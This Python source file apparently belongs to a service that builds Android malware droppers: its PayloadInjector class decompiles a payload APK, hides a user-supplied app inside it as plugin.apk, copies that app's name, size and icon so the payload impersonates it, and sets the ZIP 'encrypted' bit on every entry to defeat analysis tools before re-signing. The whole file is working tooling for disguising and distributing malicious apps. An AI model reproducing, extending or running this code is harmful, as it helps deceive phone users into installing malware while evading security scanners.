import os
import re
import shutil
import asyncio
import logging
import subprocess
import struct
import time
from pathlib import Path
from .config import APKTOOL_PATH, ZIPALIGN_PATH, APKSIGNER_PATH, DEBUG_KEYSTORE_PATHS, DEBUG_KEYSTORE_PASSWORD, DEBUG_KEYSTORE_ALIAS
from .apk_analyzer import APKAnalyzer
from .keystore_generator import create_temp_keystore, cleanup_keystore

logger = logging.getLogger(__name__)


class PayloadInjector:

    _predecompiled_cache = None
    _cache_lock = None

    def __init__(self, payload_apk_path, use_cache=False):
        self.payload_apk = payload_apk_path
        self.work_dir = None
        self.decompiled_dir = None
        self.use_cache = use_cache

        if PayloadInjector._cache_lock is None:
            import asyncio
            PayloadInjector._cache_lock = asyncio.Lock()

    @classmethod
    async def prepare_cache(cls, payload_apk_path):
        import asyncio

        if cls._cache_lock is None:
            cls._cache_lock = asyncio.Lock()

        async with cls._cache_lock:
            if cls._predecompiled_cache and os.path.exists(cls._predecompiled_cache):
                logger.info("✅ Payload cache already exists")
                return True

            logger.info("🚀 Pre-decompiling payload (one-time setup)...")

            cache_dir = "cache/payload_decompiled"
            os.makedirs(cache_dir, exist_ok=True)

            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'd', payload_apk_path,
                '-o', cache_dir,
                '-f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if process.returncode != 0:
                logger.error(f"Cache decompile failed: {stderr.decode('utf-8', errors='ignore')}")
                return False

            cls._predecompiled_cache = cache_dir
            logger.info(f"✅ Payload cache ready: {cache_dir}")
            return True

    async def inject(self, user_apk_path, output_path, user_id=None, username=None):
        start_time = time.time()

        try:
            logger.info(f"🚀 Starting payload injection for user {user_id} ({username})")

            logger.info("📦 Step 1/6: Decompiling payload...")
            decompiled = await self._decompile_payload()
            if not decompiled:
                return None, "Failed to decompile payload", 0

            logger.info("🔍 Step 2/6: Analyzing user APK...")
            app_info = await self._analyze_user_apk(user_apk_path)
            if not app_info:
                return None, "Failed to analyze user APK", int(time.time() - start_time)

            logger.info(f"✅ App: {app_info['name']} ({app_info['size']})")

            logger.info("📋 Step 3/6: Injecting user APK...")
            if not await self._inject_plugin_apk(user_apk_path):
                return None, "Failed to inject plugin.apk", int(time.time() - start_time)

            logger.info("⚙️ Step 4/6: Updating config...")
            if not await self._update_config_js(app_info['name'], app_info['size']):
                return None, "Failed to update config.js", int(time.time() - start_time)

            logger.info("📝 Step 4.5/6: Updating payload app name...")
            if not await self._update_payload_app_name(app_info['name']):
                logger.warning("Failed to update payload app name, continuing...")

            logger.info("🎨 Step 5/6: Updating icon...")
            if app_info['icon_path']:
                await self._inject_icon(app_info['icon_path'])

            logger.info("🔨 Step 6/6: Building final APK...")
            final_apk = await self._rebuild_and_sign(output_path)
            if not final_apk:
                return None, "Failed to build final APK", int(time.time() - start_time)

            duration = int(time.time() - start_time)
            logger.info(f"✅ Payload injection complete: {final_apk} (Duration: {duration}s)")

            return final_apk, None, duration

        except Exception as e:
            duration = int(time.time() - start_time)
            logger.error(f"Injection error after {duration}s: {str(e)}")
            return None, str(e), duration
        finally:
            await self._cleanup()

    async def _decompile_payload(self):
        try:
            import tempfile
            self.work_dir = tempfile.mkdtemp(prefix='payload_work_')
            self.decompiled_dir = os.path.join(self.work_dir, 'decompiled')

            if self.use_cache and PayloadInjector._predecompiled_cache:
                if os.path.exists(PayloadInjector._predecompiled_cache):
                    logger.info("⚡ Using cached payload (fast mode)")
                    try:
                        import platform
                        if platform.system() == 'Windows':
                            result = subprocess.run(
                                ['xcopy', PayloadInjector._predecompiled_cache, self.decompiled_dir, '/E', '/I', '/Q', '/Y'],
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                            if result.returncode != 0:
                                raise Exception("xcopy failed")
                        else:
                            result = subprocess.run(
                                ['cp', '-r', PayloadInjector._predecompiled_cache, self.decompiled_dir],
                                capture_output=True,
                                text=True,
                                timeout=30
                            )
                            if result.returncode != 0:
                                raise Exception("cp failed")

                        logger.info("✅ Payload ready from cache")
                        return True
                    except Exception as e:
                        logger.error(f"Fast copy failed: {str(e)}, trying shutil...")
                        try:
                            shutil.copytree(PayloadInjector._predecompiled_cache, self.decompiled_dir)
                            logger.info("✅ Payload ready from cache (shutil)")
                            return True
                        except Exception as e2:
                            logger.error(f"Cache copy failed: {str(e2)}")
                            logger.info("Falling back to normal decompile...")

            logger.info("Decompiling payload...")
            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'd', self.payload_apk,
                '-o', self.decompiled_dir,
                '-f',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if process.returncode != 0:
                logger.error(f"Decompile failed: {stderr.decode('utf-8', errors='ignore')}")
                return False

            logger.info("✅ Payload decompiled")
            return True

        except Exception as e:
            logger.error(f"Decompile error: {str(e)}")
            return False

    async def _analyze_user_apk(self, user_apk_path):
        try:
            import tempfile

            analyzer = APKAnalyzer(user_apk_path)
            analyze_dir = tempfile.mkdtemp(prefix='analyze_')

            results = await analyzer.analyze(analyze_dir)

            file_size = os.path.getsize(user_apk_path)
            size_mb = file_size / (1024 * 1024)

            icon_path = None
            if results.get('icon_path') and os.path.exists(results['icon_path']):
                icon_filename = os.path.basename(results['icon_path'])
                icon_path = os.path.join(self.work_dir, icon_filename)
                shutil.copy2(results['icon_path'], icon_path)
                logger.debug(f"Icon saved to: {icon_path}")

            info = {
                'name': results.get('app_name') or 'Unknown App',
                'package': results.get('package_name') or 'unknown.package',
                'size': f"{size_mb:.1f} MB",
                'icon_path': icon_path
            }

            try:
                shutil.rmtree(analyze_dir, ignore_errors=True)
            except:
                pass

            return info

        except Exception as e:
            logger.error(f"Analysis error: {str(e)}")
            return None

    async def _inject_plugin_apk(self, user_apk_path):
        try:
            plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')

            if os.path.exists(plugin_path):
                os.remove(plugin_path)
                logger.debug("Removed old plugin.apk")

            temp_encrypted = os.path.join(self.work_dir, 'plugin_encrypted.apk')
            temp_aligned = os.path.join(self.work_dir, 'plugin_aligned.apk')
            temp_signed = os.path.join(self.work_dir, 'plugin_signed.apk')


            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            logger.info("📦 Processing plugin.apk:")
            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            logger.info("🔐 Step 1: Encrypting plugin...")

            already_encrypted = await self._check_bitflag(user_apk_path)

            if already_encrypted:
                logger.info("✅ BitFlag already present, skipping encryption")
                current_apk = user_apk_path
            else:
                encrypted_apk = await self._encrypt_bitflag(user_apk_path, temp_encrypted)

                if not encrypted_apk:
                    logger.warning("⚠️  Encryption failed, using original")
                    current_apk = user_apk_path
                else:
                    logger.info("✅ Plugin encrypted (BitFlag)")
                    current_apk = temp_encrypted

            logger.info("⚙️  Step 2: Zipalign plugin...")

            if await self._zipalign(current_apk, temp_aligned):
                logger.info("✅ Plugin aligned")
                current_apk = temp_aligned
            else:
                logger.warning("⚠️  Zipalign failed, continuing without it")

            logger.info("✍️  Step 3: Signing plugin...")

            signed_apk = await self._sign_apk(current_apk, plugin_path)

            if not signed_apk or not os.path.exists(plugin_path):
                logger.error("❌ Signing failed!")
                logger.warning("⚠️  Copying without signature")
                shutil.copy2(current_apk, plugin_path)
            else:
                logger.info("✅ Plugin signed with debug.keystore")

            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            logger.info("✅ Plugin ready: BitFlag 🔐 → Aligned ⚙️ → Signed ✍️")
            logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

            return True

        except Exception as e:
            logger.error(f"Plugin injection error: {str(e)}")
            return False

    async def _update_config_js(self, app_name, app_size):
        try:
            config_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'config.js')

            if not os.path.exists(config_path):
                logger.error("config.js not found")
                return False

            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read()

            content = re.sub(
                r'appName:\s*"[^"]*"',
                f'appName: "{app_name}"',
                content
            )

            content = re.sub(
                r'appSize:\s*"[^"]*"',
                f'appSize: "{app_size}"',
                content
            )

            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(content)

            logger.info(f"✅ config.js updated: {app_name} ({app_size})")
            return True

        except Exception as e:
            logger.error(f"Config update error: {str(e)}")
            return False

    async def _update_payload_app_name(self, app_name):
        try:
            manifest_path = os.path.join(self.decompiled_dir, 'AndroidManifest.xml')

            if not os.path.exists(manifest_path):
                logger.error("AndroidManifest.xml not found")
                return False

            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()


            if 'android:label="' in content:
                content = re.sub(
                    r'android:label="[^"]*"',
                    f'android:label="{app_name}"',
                    content
                )
                logger.info(f"✅ Payload app name updated to: {app_name} (all labels)")

            if 'android:label="@string/' in content:
                string_refs = re.findall(r'android:label="@string/([^"]+)"', content)

                for string_name in set(string_refs):
                    await self._update_strings_xml(string_name, app_name)

                logger.info(f"✅ Payload app name updated to: {app_name} (string resources)")

            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)

            return True

        except Exception as e:
            logger.error(f"Payload app name update error: {str(e)}")
            return False

    async def _update_strings_xml(self, string_name, new_value):
        try:
            strings_path = os.path.join(self.decompiled_dir, 'res', 'values', 'strings.xml')

            if not os.path.exists(strings_path):
                return False

            with open(strings_path, 'r', encoding='utf-8') as f:
                content = f.read()

            pattern = f'<string name="{string_name}">([^<]*)</string>'
            if re.search(pattern, content):
                content = re.sub(
                    pattern,
                    f'<string name="{string_name}">{new_value}</string>',
                    content
                )

                with open(strings_path, 'w', encoding='utf-8') as f:
                    f.write(content)

                logger.debug(f"Updated string resource: {string_name} = {new_value}")
                return True

            return False

        except Exception as e:
            logger.debug(f"strings.xml update error: {str(e)}")
            return False

    async def _inject_icon(self, icon_path):
        try:
            target_path = os.path.join(self.decompiled_dir, 'assets', 'update', 'app.png')

            if os.path.exists(target_path):
                os.remove(target_path)

            shutil.copy2(icon_path, target_path)
            logger.info("✅ Web icon updated (app.png)")

            await self._update_payload_launcher_icon(icon_path)

            await self._fix_manifest_icon_reference()

            return True

        except Exception as e:
            logger.error(f"Icon injection error: {str(e)}")
            return False

    async def _fix_manifest_icon_reference(self):
        try:
            manifest_path = os.path.join(self.decompiled_dir, 'AndroidManifest.xml')

            if not os.path.exists(manifest_path):
                return False

            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()

            if '@mipmap/ic_launcher' not in content and '@drawable/ic_launcher' not in content:
                content = re.sub(
                    r'android:icon="[^"]*"',
                    'android:icon="@mipmap/ic_launcher"',
                    content,
                    count=1
                )

                content = re.sub(
                    r'android:roundIcon="[^"]*"',
                    'android:roundIcon="@mipmap/ic_launcher_round"',
                    content
                )

                with open(manifest_path, 'w', encoding='utf-8') as f:
                    f.write(content)

                logger.info("✅ Manifest icon reference fixed")

            return True

        except Exception as e:
            logger.debug(f"Manifest icon fix error: {str(e)}")
            return False

    async def _update_payload_launcher_icon(self, icon_path):
        try:
            res_dir = os.path.join(self.decompiled_dir, 'res')

            if not os.path.exists(res_dir):
                logger.warning("res directory not found")
                return False

            adaptive_dirs = [
                'mipmap-anydpi-v26',
                'mipmap-anydpi',
            ]

            removed_xml = 0
            for adaptive_dir in adaptive_dirs:
                dir_path = os.path.join(res_dir, adaptive_dir)
                if os.path.exists(dir_path):
                    for file in os.listdir(dir_path):
                        if 'ic_launcher' in file.lower() and file.endswith('.xml'):
                            xml_file = os.path.join(dir_path, file)
                            os.remove(xml_file)
                            removed_xml += 1
                            logger.debug(f"Removed adaptive icon: {adaptive_dir}/{file}")

            if removed_xml > 0:
                logger.info(f"🗑️  Removed {removed_xml} adaptive icon XML files")


            updated_count = 0

            for root, dirs, files in os.walk(res_dir):
                for file in files:
                    if 'ic_launcher' in file.lower() and file.endswith(('.png', '.webp', '.jpg')):
                        target_icon = os.path.join(root, file)

                        try:
                            shutil.copy2(icon_path, target_icon)
                            updated_count += 1

                            relative_path = os.path.relpath(target_icon, res_dir)
                            logger.debug(f"Updated: {relative_path}")
                        except Exception as e:
                            logger.debug(f"Could not update {file}: {e}")
                            continue

            if updated_count > 0:
                logger.info(f"✅ Launcher icon updated ({updated_count} files)")
                return True
            else:
                logger.warning("No ic_launcher files found to update")
                return False

        except Exception as e:
            logger.error(f"Launcher icon update error: {str(e)}")
            return False

    async def _rebuild_and_sign(self, output_path):
        try:
            unsigned_apk = os.path.join(self.work_dir, 'unsigned.apk')
            encrypted_apk = os.path.join(self.work_dir, 'encrypted.apk')
            aligned_apk = os.path.join(self.work_dir, 'aligned.apk')

            logger.info("Building APK...")
            process = await asyncio.create_subprocess_exec(
                'java', '-jar', str(APKTOOL_PATH),
                'b', self.decompiled_dir,
                '-o', unsigned_apk,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            if process.returncode != 0:
                logger.error(f"Build failed: {stderr.decode('utf-8', errors='ignore')}")
                return None

            logger.info("✅ APK built")

            logger.info("🔐 Encrypting payload (BitFlag)...")
            if not await self._encrypt_bitflag(unsigned_apk, encrypted_apk):
                logger.warning("Encryption failed, continuing without BitFlag")
                encrypted_apk = unsigned_apk
            else:
                logger.info("✅ Payload encrypted")

            logger.info("Running zipalign...")
            if not await self._zipalign(encrypted_apk, aligned_apk):
                return None

            logger.info("Signing APK...")
            final_apk = await self._sign_apk(aligned_apk, output_path)

            return final_apk

        except Exception as e:
            logger.error(f"Rebuild error: {str(e)}")
            return None

    async def _zipalign(self, input_apk, output_apk):
        try:
            if os.path.exists(output_apk):
                os.remove(output_apk)

            cmd = [ZIPALIGN_PATH, "-p", "-f", "4", input_apk, output_apk]
            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode != 0:
                logger.error(f"zipalign failed: {result.stderr}")
                return False

            logger.info("✅ zipalign done")
            return True

        except Exception as e:
            logger.error(f"zipalign error: {str(e)}")
            return False

    async def _sign_apk(self, input_apk, output_apk):
        temp_keystore = None

        try:
            keystore = None
            password = DEBUG_KEYSTORE_PASSWORD
            alias = DEBUG_KEYSTORE_ALIAS

            for path in DEBUG_KEYSTORE_PATHS:
                if os.path.exists(path):
                    keystore = path
                    logger.debug(f"Using debug.keystore: {keystore}")
                    break

            if not keystore:
                logger.info("🔑 debug.keystore not found, creating temporary keystore (suzi)...")
                keystore, password, alias = create_temp_keystore(alias='suzi')

                if not keystore:
                    logger.error("Failed to create keystore")
                    return None

                temp_keystore = keystore
                logger.info(f"✅ Temporary keystore created: {alias}")

            if os.path.exists(output_apk):
                os.remove(output_apk)

            cmd = [
                APKSIGNER_PATH, 'sign',
                '--ks', keystore,
                '--ks-pass', f'pass:{password}',
                '--ks-key-alias', alias,
                '--key-pass', f'pass:{password}',
                '--out', output_apk,
                input_apk
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode != 0:
                logger.error(f"Signing failed: {result.stderr}")
                return None

            logger.info("✅ APK signed")
            return output_apk

        except Exception as e:
            logger.error(f"Signing error: {str(e)}")
            return None
        finally:
            if temp_keystore:
                cleanup_keystore(temp_keystore)

    async def _check_bitflag(self, apk_path):
        try:
            with open(apk_path, 'rb') as f:
                data = f.read()

            eocd_sig = b'\x50\x4B\x05\x06'
            eocd_offset = data.rfind(eocd_sig)
            if eocd_offset == -1:
                return False

            cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
            cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]

            pos = cd_offset
            encrypted_count = 0
            total_count = 0

            while pos < cd_offset + cd_size:
                if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
                    break

                bitflag_offset = pos + 8
                bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]

                total_count += 1
                if bitflag & 0x0001:
                    encrypted_count += 1

                name_len = struct.unpack_from('<H', data, pos + 28)[0]
                extra_len = struct.unpack_from('<H', data, pos + 30)[0]
                comment_len = struct.unpack_from('<H', data, pos + 32)[0]
                pos += 46 + name_len + extra_len + comment_len

            if total_count > 0 and encrypted_count > (total_count * 0.5):
                logger.info(f"🔍 BitFlag detected: {encrypted_count}/{total_count} entries encrypted")
                return True

            return False

        except Exception as e:
            logger.debug(f"BitFlag check error: {str(e)}")
            return False

    async def _encrypt_bitflag(self, input_apk, output_apk):
        try:
            with open(input_apk, 'rb') as f:
                data = f.read()

            eocd_sig = b'\x50\x4B\x05\x06'
            eocd_offset = data.rfind(eocd_sig)
            if eocd_offset == -1:
                logger.error("EOCD not found")
                return False

            cd_size = struct.unpack_from('<I', data, eocd_offset + 12)[0]
            cd_offset = struct.unpack_from('<I', data, eocd_offset + 16)[0]

            pos = cd_offset
            modified = bytearray(data)
            count = 0

            while pos < cd_offset + cd_size:
                if pos + 4 > len(data) or data[pos:pos+4] != b'\x50\x4B\x01\x02':
                    break

                bitflag_offset = pos + 8
                bitflag = struct.unpack_from('<H', data, bitflag_offset)[0]

                if not (bitflag & 0x0001):
                    bitflag |= 0x0001
                    struct.pack_into('<H', modified, bitflag_offset, bitflag)
                    count += 1

                name_len = struct.unpack_from('<H', data, pos + 28)[0]
                extra_len = struct.unpack_from('<H', data, pos + 30)[0]
                comment_len = struct.unpack_from('<H', data, pos + 32)[0]
                pos += 46 + name_len + extra_len + comment_len

            with open(output_apk, 'wb') as f:
                f.write(modified)

            logger.info(f"✅ BitFlag set on {count} entries")
            return True

        except Exception as e:
            logger.error(f"BitFlag encryption error: {str(e)}")
            return False

    async def _cleanup(self):
        try:
            if self.work_dir and os.path.exists(self.work_dir):
                shutil.rmtree(self.work_dir, ignore_errors=True)
                logger.debug(f"Cleaned up: {self.work_dir}")
        except:
            pass
